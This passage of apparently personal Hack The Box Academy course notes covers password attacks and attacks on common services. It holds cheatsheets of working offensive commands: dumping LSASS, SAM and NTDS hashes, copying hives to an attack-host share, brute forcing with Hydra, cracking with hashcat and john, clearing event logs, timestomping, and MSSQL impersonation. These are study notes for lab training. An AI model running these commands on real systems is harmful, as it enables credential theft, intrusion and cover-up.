style=text-align:left><code>sniffer_interfaces</code></td><td style=text-align:left>List the available interfaces on the target.</td></tr><tr><td style=text-align:left><code>sniffer_dump &lt;interfaceID> pcapname</code></td><td style=text-align:left>Start sniffing on the remote target.</td></tr><tr><td style=text-align:left><code>sniffer_start &lt;interfaceID> packet-buffer</code></td><td style=text-align:left>Start sniffing with a specific range for a packet buffer.</td></tr><tr><td style=text-align:left><code>sniffer_stats &lt;interfaceID></code></td><td style=text-align:left>Grab statistical information from the interface you are sniffing.</td></tr><tr><td style=text-align:left><code>sniffer_stop &lt;interfaceID></code></td><td style=text-align:left>Stop the sniffer.</td></tr><tr><td style=text-align:left><code>add_user &lt;username> &lt;password> -h &lt;ip></code></td><td style=text-align:left>Add a user on the remote target.</td></tr><tr><td style=text-align:left><code>add_group_user &lt;"Domain Admins"> &lt;username> -h &lt;ip></code></td><td style=text-align:left>Add a username to the Domain Administrators group on the remote target.</td></tr><tr><td style=text-align:left><code>clearev</code></td><td style=text-align:left>Clear the event log on the target machine.</td></tr><tr><td style=text-align:left><code>timestomp</code></td><td style=text-align:left>Change file attributes, such as creation date (antiforensics measure).</td></tr><tr><td style=text-align:left><code>reboot</code></td><td style=text-align:left>Reboot the target machine.</td></tr><tr><td style=text-align:left></td><td style=text-align:left></td></tr></tbody></table><h3 id=complete-6>Complete<a hidden class=anchor aria-hidden=true href=#complete-6>#</a></h3><p><a href=https://academy.hackthebox.com/achievement/713396/39 title="Link of Completion" target=_blank rel="nofollow noopener">Link of Completion</a></p><h2 id=password-attacks>Password attacks<a hidden class=anchor aria-hidden=true href=#password-attacks>#</a></h2><h3 id=credential-storage>Credential storage<a hidden class=anchor aria-hidden=true href=#credential-storage>#</a></h3><p><strong>Linux</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>root@htb:~# cat /etc/shadow
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>...SNIP...
</span></span><span class=line><span class=cl>htb-student:<span class=nv>$y$j9T$3</span>QSBB6CbHEu...SNIP...f8Ms:18955:0:99999:7:::
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;username&gt;:&lt;encrypted password&gt;:&lt;day of last change&gt;:&lt;min age&gt;:&lt;max age&gt;:&lt;warning period&gt;:&lt;inactivity period&gt;:&lt;expiration date&gt;:&lt;reserved field&gt;
</span></span></code></pre></div><p>The type (<code>id</code>) is the cryptographic hash method used to encrypt the password. Many different cryptographic hash methods were used in the past and are still used by some systems today.</p><table><thead><tr><th style=text-align:left>ID</th><th style=text-align:left>Cryptographic Hash Algorithm</th></tr></thead><tbody><tr><td style=text-align:left><code>$1$</code></td><td style=text-align:left>MD5</td></tr><tr><td style=text-align:left><code>$2a$</code></td><td style=text-align:left>Blowfish</td></tr><tr><td style=text-align:left><code>$5$</code></td><td style=text-align:left>SHA-256</td></tr><tr><td style=text-align:left><code>$6$</code></td><td style=text-align:left>SHA-512</td></tr><tr><td style=text-align:left><code>$sha1$</code></td><td style=text-align:left>SHA1crypt</td></tr><tr><td style=text-align:left><code>$y$</code></td><td style=text-align:left>Yescrypt</td></tr><tr><td style=text-align:left><code>$gy$</code></td><td style=text-align:left>Gost-yescrypt</td></tr><tr><td style=text-align:left><code>$7$</code></td><td style=text-align:left>Scrypt</td></tr></tbody></table><p><strong>Windows Authentication Process</strong><figure class=image-caption><img alt=windows-auth srcset="/posts/htb/pentester/images/auth_hu16403638153275111429.webp 480w,
/posts/htb/pentester/images/auth_hu9556311866857920906.webp 768w,
/posts/htb/pentester/images/auth_hu3397964103430747282.webp 1024w" sizes=100vw src=images/auth.png width=768 height=441 loading=lazy><figcaption></figcaption></figure></p><p>Local interactive logon is performed by the interaction between the logon process (<a href="https://www.microsoftpressstore.com/articles/article.aspx?p=2228450&amp;seqNum=8" title=WinLogon target=_blank rel="nofollow noopener">WinLogon</a> ), the logon user interface process (<code>LogonUI</code>), the credential providers, LSASS, one or more authentication packages, and SAM or Active Directory. Authentication packages, in this case, are the Dynamic-Link Libraries (<code>DLLs</code>) that perform authentication checks. For example, for non-domain joined and interactive logins, the authentication package <code>Msv1_0.dll</code> is used.</p><p><code>Winlogon</code> is a trusted process responsible for managing security-related user interactions. These include:</p><p>Launching LogonUI to enter passwords at login</p><p>Changing passwords</p><p>Locking and unlocking the workstation</p><p>It relies on credential providers installed on the system to obtain a user&rsquo;s account name or password. Credential providers are <code>COM</code> objects that are located in DLLs.</p><p>Winlogon is the only process that intercepts login requests from the keyboard sent via an RPC message from Win32k.sys. Winlogon immediately launches the LogonUI application at logon to display the user interface for logon. After Winlogon obtains a user name and password from the credential providers, it calls LSASS to authenticate the user attempting to log in.</p><p><strong>LSASS</strong></p><p><a href=https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service title="Local Security Authority Subsystem Service" target=_blank rel="nofollow noopener">Local Security Authority Subsystem Service</a> (<code>LSASS</code>) is a collection of many modules and has access to all authentication processes that can be found in <code>%SystemRoot%\System32\Lsass.exe</code>. This service is responsible for the local system security policy, user authentication, and sending security audit logs to the <code>Event log</code>. In other words, it is the vault for Windows-based operating systems, and we can find a more detailed illustration of the LSASS architecture <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc961760%28v=technet.10%29?redirectedfrom=MSDN" title=here target=_blank rel="nofollow noopener">here</a>.</p><table><thead><tr><th style=text-align:left>Authentication Package</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>Lsasrv.dll</code></td><td style=text-align:left>The LSA Server service both enforces security policies and acts as the security package manager for the LSA. The LSA contains the Negotiate function, which selects either the NTLM or Kerberos protocol after determining which protocol is to be successful.</td></tr><tr><td style=text-align:left><code>Msv1_0.dll</code></td><td style=text-align:left>Authentication package for local machine logons that don&rsquo;t require custom authentication.</td></tr><tr><td style=text-align:left><code>Samsrv.dll</code></td><td style=text-align:left>The Security Accounts Manager (SAM) stores local security accounts, enforces locally stored policies, and supports APIs.</td></tr><tr><td style=text-align:left><code>Kerberos.dll</code></td><td style=text-align:left>Security package loaded by the LSA for Kerberos-based authentication on a machine.</td></tr><tr><td style=text-align:left><code>Netlogon.dll</code></td><td style=text-align:left>Network-based logon service.</td></tr><tr><td style=text-align:left><code>Ntdsa.dll</code></td><td style=text-align:left>This library is used to create new records and folders in the Windows registry.</td></tr></tbody></table><p><strong>SAM</strong></p><p>The <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc756748%28v=ws.10%29?redirectedfrom=MSDN" title="Security Account Manager" target=_blank rel="nofollow noopener">Security Account Manager</a> (<code>SAM</code>) is a database file in Windows operating systems that stores users&rsquo; passwords. It can be used to authenticate local and remote users. SAM uses cryptographic measures to prevent unauthenticated users from accessing the system. User passwords are stored in a hash format in a registry structure as either an <code>LM</code> hash or an <code>NTLM</code> hash. This file is located in <code>%SystemRoot%/system32/config/SAM</code> and is mounted on HKLM/SAM. SYSTEM level permissions are required to view it.</p><p>Windows systems can be assigned to either a workgroup or domain during setup. If the system has been assigned to a workgroup, it handles the SAM database locally and stores all existing users locally in this database. However, if the system has been joined to a domain, the Domain Controller (<code>DC</code>) must validate the credentials from the Active Directory database (<code>ntds.dit</code>), which is stored in <code>%SystemRoot%\ntds.dit</code>.</p><p>Microsoft introduced a security feature in Windows NT 4.0 to help improve the security of the SAM database against offline software cracking. This is the <code>SYSKEY</code> (<code>syskey.exe</code>) feature, which, when enabled, partially encrypts the hard disk copy of the SAM file so that the password hash values for all local accounts stored in the SAM are encrypted with a key.</p><p><figure class=image-caption><img alt=credmanager srcset="/posts/htb/pentester/images/sam_hu17232609584205819843.webp 480w,
/posts/htb/pentester/images/sam_hu11263086712585131200.webp 768w,
/posts/htb/pentester/images/sam_hu8614434111508609877.webp 1024w" sizes=100vw src=images/sam.png width=768 height=734 loading=lazy><figcaption></figcaption></figure></p><p><strong>NTDS</strong></p><p>It is very common to come across network environments where Windows systems are joined to a Windows domain. This is common because it makes it easier for admins to manage all the systems owned by their respective organizations (centralized management). In these cases, the Windows systems will send all logon requests to Domain Controllers that belong to the same Active Directory forest. Each Domain Controller hosts a file called <code>NTDS.dit</code> that is kept synchronized across all Domain Controllers with the exception of <a href=https://docs.microsoft.com/en-us/windows/win32/ad/rodc-and-active-directory-schema title="Read-Only Domain Controllers" target=_blank rel="nofollow noopener">Read-Only Domain Controllers</a>. NTDS.dit is a database file that stores the data in Active Directory, including but not limited to:</p><ul><li>User accounts (username & password hash)</li><li>Group accounts</li><li>Computer accounts</li><li>Group policy objects</li></ul><h3 id=cheatsheet-2>Cheatsheet<a hidden class=anchor aria-hidden=true href=#cheatsheet-2>#</a></h3><p><strong>Connecting to Target</strong></p><table><thead><tr><th style=text-align:left><strong>Command</strong></th><th style=text-align:left><strong>Description</strong></th></tr></thead><tbody><tr><td style=text-align:left><code>xfreerdp /v:&lt;ip> /u:htb-student /p:HTB_@cademy_stdnt!</code></td><td style=text-align:left>CLI-based tool used to connect to a Windows target using the Remote Desktop Protocol.</td></tr><tr><td style=text-align:left><code>evil-winrm -i &lt;ip> -u user -p password</code></td><td style=text-align:left>Uses Evil-WinRM to establish a Powershell session with a target.</td></tr><tr><td style=text-align:left><code>ssh user@&lt;ip></code></td><td style=text-align:left>Uses SSH to connect to a target using a specified user.</td></tr><tr><td style=text-align:left><code>smbclient -U user \\\\&lt;ip>\\SHARENAME</code></td><td style=text-align:left>Uses smbclient to connect to an SMB share using a specified user.</td></tr><tr><td style=text-align:left><code>python3 smbserver.py -smb2support CompData /home/&lt;nameofuser>/Documents/</code></td><td style=text-align:left>Uses smbserver.py to create a share on a linux-based attack host. Can be useful when needing to transfer files from a target to an attack host.</td></tr></tbody></table><p><strong>Password Mutations</strong></p><table><thead><tr><th style=text-align:left><strong>Command</strong></th><th style=text-align:left><strong>Description</strong></th></tr></thead><tbody><tr><td style=text-align:left><code>cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist</code></td><td style=text-align:left>Uses cewl to generate a wordlist based on keywords present on a website.</td></tr><tr><td style=text-align:left><code>hashcat --force password.list -r custom.rule --stdout > mut_password.list</code></td><td style=text-align:left>Uses Hashcat to generate a rule-based word list.</td></tr><tr><td style=text-align:left><code>./username-anarchy -i /path/to/listoffirstandlastnames.txt</code></td><td style=text-align:left>Users username-anarchy tool in conjunction with a pre-made list of first and last names to generate a list of potential username.</td></tr><tr><td style=text-align:left><code>curl -s https://fileinfo.com/filetypes/compressed | html2text | awk '{print tolower($1)}' | grep "\." | tee -a compressed_ext.txt</code></td><td style=text-align:left>Uses Linux-based commands curl, awk, grep and tee to download a list of file extensions to be used in searching for files that could contain passwords.</td></tr></tbody></table><p><strong>Remote Password Attacks</strong></p><table><thead><tr><th style=text-align:left><strong>Command</strong></th><th style=text-align:left><strong>Description</strong></th></tr></thead><tbody><tr><td style=text-align:left><code>crackmapexec winrm &lt;ip> -u user.list -p password.list</code></td><td style=text-align:left>Uses CrackMapExec over WinRM to attempt to brute force user names and passwords specified hosted on a target.</td></tr><tr><td style=text-align:left><code>crackmapexec smb &lt;ip> -u "user" -p "password" --shares</code></td><td style=text-align:left>Uses CrackMapExec to enumerate smb shares on a target using a specified set of credentials.</td></tr><tr><td style=text-align:left><code>hydra -L user.list -P password.list &lt;service>://&lt;ip></code></td><td style=text-align:left>Uses Hydra in conjunction with a user list and password list to attempt to crack a password over the specified service.</td></tr><tr><td style=text-align:left><code>hydra -l username -P password.list &lt;service>://&lt;ip></code></td><td style=text-align:left>Uses Hydra in conjunction with a username and password list to attempt to crack a password over the specified service.</td></tr><tr><td style=text-align:left><code>hydra -L user.list -p password &lt;service>://&lt;ip></code></td><td style=text-align:left>Uses Hydra in conjunction with a user list and password to attempt to crack a password over the specified service.</td></tr><tr><td style=text-align:left><code>hydra -C &lt;user_pass.list> ssh://&lt;IP></code></td><td style=text-align:left>Uses Hydra in conjunction with a list of credentials to attempt to login to a target over the specified service. This can be used to attempt a credential stuffing attack.</td></tr><tr><td style=text-align:left><code>crackmapexec smb &lt;ip> --local-auth -u &lt;username> -p &lt;password> --sam</code></td><td style=text-align:left>Uses CrackMapExec in conjunction with admin credentials to dump password hashes stored in SAM, over the network.</td></tr><tr><td style=text-align:left><code>crackmapexec smb &lt;ip> --local-auth -u &lt;username> -p &lt;password> --lsa</code></td><td style=text-align:left>Uses CrackMapExec in conjunction with admin credentials to dump lsa secrets, over the network. It is possible to get clear-text credentials this way.</td></tr><tr><td style=text-align:left><code>crackmapexec smb &lt;ip> -u &lt;username> -p &lt;password> --ntds</code></td><td style=text-align:left>Uses CrackMapExec in conjunction with admin credentials to dump hashes from the ntds file over a network.</td></tr><tr><td style=text-align:left><code>evil-winrm -i &lt;ip> -u Administrator -H "&lt;passwordhash>"</code></td><td style=text-align:left>Uses Evil-WinRM to establish a Powershell session with a Windows target using a user and password hash. This is one type of <code>Pass-The-Hash</code> attack.</td></tr></tbody></table><p><strong>Windows Local Password Attacks</strong></p><table><thead><tr><th style=text-align:left><strong>Command</strong></th><th style=text-align:left><strong>Description</strong></th></tr></thead><tbody><tr><td style=text-align:left><code>tasklist /svc</code></td><td style=text-align:left>A command-line-based utility in Windows used to list running processes.</td></tr><tr><td style=text-align:left><code>findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml</code></td><td style=text-align:left>Uses Windows command-line based utility findstr to search for the string &ldquo;password&rdquo; in many different file type.</td></tr><tr><td style=text-align:left><code>Get-Process lsass</code></td><td style=text-align:left>A Powershell cmdlet is used to display process information. Using this with the LSASS process can be helpful when attempting to dump LSASS process memory from the command line.</td></tr><tr><td style=text-align:left><code>rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full</code></td><td style=text-align:left>Uses rundll32 in Windows to create a LSASS memory dump file. This file can then be transferred to an attack box to extract credentials.</td></tr><tr><td style=text-align:left><code>pypykatz lsa minidump /path/to/lsassdumpfile</code></td><td style=text-align:left>Uses Pypykatz to parse and attempt to extract credentials & password hashes from an LSASS process memory dump file.</td></tr><tr><td style=text-align:left><code>reg.exe save hklm\sam C:\sam.save</code></td><td style=text-align:left>Uses reg.exe in Windows to save a copy of a registry hive at a specified location on the file system. It can be used to make copies of any registry hive (i.e., hklm\sam, hklm\security, hklm\system).</td></tr><tr><td style=text-align:left><code>move sam.save \\&lt;ip>\NameofFileShare</code></td><td style=text-align:left>Uses move in Windows to transfer a file to a specified file share over the network.</td></tr><tr><td style=text-align:left><code>python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL</code></td><td style=text-align:left>Uses Secretsdump.py to dump password hashes from the SAM database.</td></tr><tr><td style=text-align:left><code>vssadmin CREATE SHADOW /For=C:</code></td><td style=text-align:left>Uses Windows command line based tool vssadmin to create a volume shadow copy for <code>C:</code>. This can be used to make a copy of NTDS.dit safely.</td></tr><tr><td style=text-align:left><code>cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit</code></td><td style=text-align:left>Uses Windows command line based tool copy to create a copy of NTDS.dit for a volume shadow copy of <code>C:</code>.</td></tr></tbody></table><p><strong>Linux Local Password Attacks</strong></p><table><thead><tr><th style=text-align:left><strong>Command</strong></th><th style=text-align:left><strong>Description</strong></th></tr></thead><tbody><tr><td style=text-align:left><code>for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib|fonts|share|core" ;done</code></td><td style=text-align:left>Script that can be used to find .conf, .config and .cnf files on a Linux system.</td></tr><tr><td style=text-align:left><code>for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc|lib");do echo -e "\nFile: " $i; grep "user|password|pass" $i 2>/dev/null | grep -v "\#";done</code></td><td style=text-align:left>Script that can be used to find credentials in specified file types.</td></tr><tr><td style=text-align:left><code>for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc|lib|headers|share|man";done</code></td><td style=text-align:left>Script that can be used to find common database files.</td></tr><tr><td style=text-align:left><code>find /home/* -type f -name "*.txt" -o ! -name "*.*"</code></td><td style=text-align:left>Uses Linux-based find command to search for text files.</td></tr><tr><td style=text-align:left><code>for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc|lib|headers|share";done</code></td><td style=text-align:left>Script that can be used to search for common file types used with scripts.</td></tr><tr><td style=text-align:left><code>for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib|fonts|share|core" ;done</code></td><td style=text-align:left>Script used to look for common types of documents.</td></tr><tr><td style=text-align:left><code>cat /etc/crontab</code></td><td style=text-align:left>Uses Linux-based cat command to view the contents of crontab in search for credentials.</td></tr><tr><td style=text-align:left><code>ls -la /etc/cron.*/</code></td><td style=text-align:left>Uses Linux-based ls -la command to list all files that start with <code>cron</code> contained in the etc directory.</td></tr><tr><td style=text-align:left><code>grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1"</code></td><td style=text-align:left>Uses Linux-based command grep to search the file system for key terms <code>PRIVATE KEY</code> to discover SSH keys.</td></tr><tr><td style=text-align:left><code>grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"</code></td><td style=text-align:left>Uses Linux-based grep command to search for the keywords <code>PRIVATE KEY</code> within files contained in a user&rsquo;s home directory.</td></tr><tr><td style=text-align:left><code>grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"</code></td><td style=text-align:left>Uses Linux-based grep command to search for keywords <code>ssh-rsa</code> within files contained in a user&rsquo;s home directory.</td></tr><tr><td style=text-align:left><code>tail -n5 /home/*/.bash*</code></td><td style=text-align:left>Uses Linux-based tail command to search the through bash history files and output the last 5 lines.</td></tr><tr><td style=text-align:left><code>python3 mimipenguin.py</code></td><td style=text-align:left>Runs Mimipenguin.py using python3.</td></tr><tr><td style=text-align:left><code>bash mimipenguin.sh</code></td><td style=text-align:left>Runs Mimipenguin.sh using bash.</td></tr><tr><td style=text-align:left><code>python2.7 lazagne.py all</code></td><td style=text-align:left>Runs Lazagne.py with all modules using python2.7</td></tr><tr><td style=text-align:left><code>ls -l .mozilla/firefox/ | grep default</code></td><td style=text-align:left>Uses Linux-based command to search for credentials stored by Firefox then searches for the keyword <code>default</code> using grep.</td></tr><tr><td style=text-align:left><code>cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .</code></td><td style=text-align:left>Uses Linux-based command cat to search for credentials stored by Firefox in JSON.</td></tr><tr><td style=text-align:left><code>python3.9 firefox_decrypt.py</code></td><td style=text-align:left>Runs Firefox_decrypt.py to decrypt any encrypted credentials stored by Firefox. Program will run using python3.9.</td></tr><tr><td style=text-align:left><code>python3 lazagne.py browsers</code></td><td style=text-align:left>Runs Lazagne.py browsers module using Python 3.</td></tr></tbody></table><p><strong>Cracking Passwords</strong></p><table><thead><tr><th style=text-align:left><strong>Command</strong></th><th style=text-align:left><strong>Description</strong></th></tr></thead><tbody><tr><td style=text-align:left><code>hashcat -m 1000 dumpedhashes.txt /usr/share/wordlists/rockyou.txt</code></td><td style=text-align:left>Uses Hashcat to crack NTLM hashes using a specified wordlist.</td></tr><tr><td style=text-align:left><code>hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt --show</code></td><td style=text-align:left>Uses Hashcat to attempt to crack a single NTLM hash and display the results in the terminal output.</td></tr><tr><td style=text-align:left><code>unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes</code></td><td style=text-align:left>Uses unshadow to combine data from passwd.bak and shadow.bk into one single file to prepare for cracking.</td></tr><tr><td style=text-align:left><code>hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked</code></td><td style=text-align:left>Uses Hashcat in conjunction with a wordlist to crack the unshadowed hashes and outputs the cracked hashes to a file called unshadowed.cracked.</td></tr><tr><td style=text-align:left><code>hashcat -m 500 -a 0 md5-hashes.list rockyou.txt</code></td><td style=text-align:left>Uses Hashcat in conjunction with a word list to crack the md5 hashes in the md5-hashes.list file.</td></tr><tr><td style=text-align:left><code>hashcat -m 22100 backup.hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt -o backup.cracked</code></td><td style=text-align:left>Uses Hashcat to crack the extracted BitLocker hashes using a wordlist and outputs the cracked hashes into a file called backup.cracked.</td></tr><tr><td style=text-align:left><code>ssh2john.pl SSH.private > ssh.hash</code></td><td style=text-align:left>Runs Ssh2john.pl script to generate hashes for the SSH keys in the SSH.private file, then redirects the hashes to a file called ssh.hash.</td></tr><tr><td style=text-align:left><code>john ssh.hash --show</code></td><td style=text-align:left>Uses John to attempt to crack the hashes in the ssh.hash file, then outputs the results in the terminal.</td></tr><tr><td style=text-align:left><code>office2john.py Protected.docx > protected-docx.hash</code></td><td style=text-align:left>Runs Office2john.py against a protected .docx file and converts it to a hash stored in a file called protected-docx.hash.</td></tr><tr><td style=text-align:left><code>john --wordlist=rockyou.txt protected-docx.hash</code></td><td style=text-align:left>Uses John in conjunction with the wordlist rockyou.txt to crack the hash protected-docx.hash.</td></tr><tr><td style=text-align:left><code>pdf2john.pl PDF.pdf > pdf.hash</code></td><td style=text-align:left>Runs Pdf2john.pl script to convert a pdf file to a pdf has to be cracked.</td></tr><tr><td style=text-align:left><code>john --wordlist=rockyou.txt pdf.hash</code></td><td style=text-align:left>Runs John in conjunction with a wordlist to crack a pdf hash.</td></tr><tr><td style=text-align:left><code>zip2john ZIP.zip > zip.hash</code></td><td style=text-align:left>Runs Zip2john against a zip file to generate a hash, then adds that hash to a file called zip.hash.</td></tr><tr><td style=text-align:left><code>john --wordlist=rockyou.txt zip.hash</code></td><td style=text-align:left>Uses John in conjunction with a wordlist to crack the hashes contained in zip.hash.</td></tr><tr><td style=text-align:left><code>bitlocker2john -i Backup.vhd > backup.hashes</code></td><td style=text-align:left>Uses Bitlocker2john script to extract hashes from a VHD file and directs the output to a file called backup.hashes.</td></tr><tr><td style=text-align:left><code>file GZIP.gzip</code></td><td style=text-align:left>Uses the Linux-based file tool to gather file format information.</td></tr><tr><td style=text-align:left><code>for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null | tar xz;done</code></td><td style=text-align:left>Script that runs a for-loop to extract files from an archive.</td></tr></tbody></table><h3 id=complete-7>Complete<a hidden class=anchor aria-hidden=true href=#complete-7>#</a></h3><p><a href=https://academy.hackthebox.com/achievement/713396/147 title="Link of Completion" target=_blank rel="nofollow noopener">Link of Completion</a></p><h2 id=attaking-common-services>Attaking Common Services<a hidden class=anchor aria-hidden=true href=#attaking-common-services>#</a></h2><h3 id=interacting-with-common-services>Interacting with Common Services<a hidden class=anchor aria-hidden=true href=#interacting-with-common-services>#</a></h3><table><thead><tr><th style=text-align:left>SMB</th><th style=text-align:left>FTP</th><th style=text-align:left>Email</th><th style=text-align:left>Databases</th></tr></thead><tbody><tr><td style=text-align:left>smbclient</td><td style=text-align:left>ftp</td><td style=text-align:left>Thunderbird</td><td style=text-align:left>mssql-cli</td></tr><tr><td style=text-align:left>CrackMapExec</td><td style=text-align:left>lftp</td><td style=text-align:left>Claws</td><td style=text-align:left>mycli</td></tr><tr><td style=text-align:left>SMBMap</td><td style=text-align:left>ncftp</td><td style=text-align:left>Geary</td><td style=text-align:left>mssqlclient.py</td></tr><tr><td style=text-align:left>Impacket</td><td style=text-align:left>filezilla</td><td style=text-align:left>MailSpring</td><td style=text-align:left>dbeaver</td></tr><tr><td style=text-align:left>psexec.py</td><td style=text-align:left>crossftp</td><td style=text-align:left>mutt</td><td style=text-align:left>MySQL Workbench</td></tr><tr><td style=text-align:left>smbexec.py</td><td style=text-align:left></td><td style=text-align:left>mailutils</td><td style=text-align:left>SQL Server Management Studio or SSMS</td></tr><tr><td style=text-align:left></td><td style=text-align:left></td><td style=text-align:left>sendEmail</td><td style=text-align:left></td></tr><tr><td style=text-align:left></td><td style=text-align:left></td><td style=text-align:left>swaks</td><td style=text-align:left></td></tr><tr><td style=text-align:left></td><td style=text-align:left></td><td style=text-align:left>sendmail</td><td style=text-align:left></td></tr></tbody></table><h3 id=smb-naming-resolution>SMB Naming Resolution<a hidden class=anchor aria-hidden=true href=#smb-naming-resolution>#</a></h3><p>When a user or a system tries to perform a Name Resolution (NR), a series of procedures are conducted by a machine to retrieve a host&rsquo;s IP address by its hostname. On Windows machines, the procedure will roughly be as follows:</p><ul><li>The hostname file share&rsquo;s IP address is required.</li><li>The local host file (C:\Windows\System32\Drivers\etc\hosts) will be checked for suitable records.</li><li>If no records are found, the machine switches to the local DNS cache, which keeps track of recently resolved names.</li><li>Is there no local DNS record? A query will be sent to the DNS server that has been configured.</li><li>If all else fails, the machine will issue a multicast query, requesting the IP address of the file share from other machines on the network.</li></ul><h3 id=mssql-attacks>MSSQL Attacks<a hidden class=anchor aria-hidden=true href=#mssql-attacks>#</a></h3><p><strong>Identify Users to Impersonate</strong>
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = &lsquo;IMPERSONATE&rsquo;
GO</p><p><strong>Verifying our Current User and Role</strong>
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER(&lsquo;sysadmin&rsquo;)
go</p><p><strong>Impersonate</strong>
EXECUTE AS LOGIN = &lsquo;john&rsquo;
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER(&lsquo;sysadmin&rsquo;)
GO</p><p><strong>Identify Linked Servers</strong>
SELECT srvname, isremote FROM sysservers
go</p><p><strong>Run Command on linked</strong>
EXECUTE(&lsquo;select @@servername, @@version, system_user, is_srvrolemember(&lsquo;&lsquo;sysadmin&rsquo;&rsquo;)&rsquo;) AT [10.0.0.12\SQLEXPRESS]
go</p><h3 id=attacking-common-services---easy>Attacking Common Services - Easy<a hidden class=anchor aria-hidden=true href=#attacking-common-services---easy>#</a></h3><p>Host: 10.129.45.215</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>┌─<span class=o>[</span>us-academy-2<span class=o>]</span>─<span class=o>[</span>10.10.14.187<span class=o>]</span>─<span class=o>[</span>htb-ac-713396@htb-ckpvnzbf3p<span class=o>]</span>─<span class=o>[</span>~<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ sudo nmap -A -T5 10.129.203.7
</span></span><span class=line><span class=cl>Starting Nmap 7.93 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2024-02-23 15:27 GMT
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.129.203.7
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.0050s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Not shown: <span class=m>993</span> filtered tcp ports <span class=o>(</span>no-response<span class=o>)</span>
</span></span><span class=line><span class=cl>PORT     STATE SERVICE       VERSION
</span></span><span class=line><span class=cl>21/tcp   open  ftp
</span></span><span class=line><span class=cl><span class=p>|</span> fingerprint-strings:
</span></span><span class=line><span class=cl><span class=p>|</span>   GenericLines:
</span></span><span class=line><span class=cl><span class=p>|</span>     <span class=m>220</span> Core FTP Server Version 2.0, build 725, 64-bit Unregistered
</span></span><span class=line><span class=cl><span class=p>|</span>     Command unknown, not supported or not allowed...
</span></span><span class=line><span class=cl><span class=p>|</span>     Command unknown, not supported or not allowed...
</span></span><span class=line><span class=cl><span class=p>|</span>   NULL:
</span></span><span class=line><span class=cl><span class=p>|</span>_    <span class=m>220</span> Core FTP Server Version 2.0, build 725, 64-bit Unregistered
</span></span><span class=line><span class=cl>25/tcp   open  smtp          hMailServer smtpd
</span></span><span class=line><span class=cl><span class=p>|</span> smtp-commands: WIN-EASY, SIZE 20480000, AUTH LOGIN PLAIN, HELP
</span></span><span class=line><span class=cl><span class=p>|</span>_ <span class=m>211</span> DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
</span></span><span class=line><span class=cl>80/tcp   open  http          Apache httpd 2.4.53 <span class=o>((</span>Win64<span class=o>)</span> OpenSSL/1.1.1n PHP/7.4.29<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.53 <span class=o>(</span>Win64<span class=o>)</span> OpenSSL/1.1.1n PHP/7.4.29
</span></span><span class=line><span class=cl><span class=p>|</span> http-title: Welcome to XAMPP
</span></span><span class=line><span class=cl><span class=p>|</span>_Requested resource was http://10.129.203.7/dashboard/
</span></span><span class=line><span class=cl>443/tcp  open  https?
</span></span><span class=line><span class=cl><span class=p>|</span> ssl-cert: Subject: <span class=nv>commonName</span><span class=o>=</span>Test/organizationName<span class=o>=</span>Testing/stateOrProvinceName<span class=o>=</span>FL/countryName<span class=o>=</span>US
</span></span><span class=line><span class=cl><span class=p>|</span> Not valid before: 2022-04-21T19:27:17
</span></span><span class=line><span class=cl><span class=p>|</span>_Not valid after:  2032-04-18T19:27:17
</span></span><span class=line><span class=cl>587/tcp  open  smtp          hMailServer smtpd
</span></span><span class=line><span class=cl><span class=p>|</span> smtp-commands: WIN-EASY, SIZE 20480000, AUTH LOGIN PLAIN, HELP
</span></span><span class=line><span class=cl><span class=p>|</span>_ <span class=m>211</span> DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
